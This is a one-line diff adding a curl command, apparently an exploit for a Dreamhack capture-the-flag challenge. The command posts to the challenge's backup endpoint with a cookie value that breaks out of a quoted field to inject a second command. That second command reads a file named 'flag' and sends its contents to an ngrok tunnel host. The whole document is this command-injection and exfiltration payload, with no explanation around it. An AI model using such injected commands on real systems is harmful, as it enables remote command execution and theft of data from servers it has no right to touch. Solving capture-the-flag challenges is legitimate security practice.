@@ -1,0 +1,1 @@
+curl -X POST -b 'backup-timestamp="; curl https://ab78-118-218-130-109.ngrok-free.app/`cat flag`/ih"' http://host1.dreamhack.games:11821/backup_notes
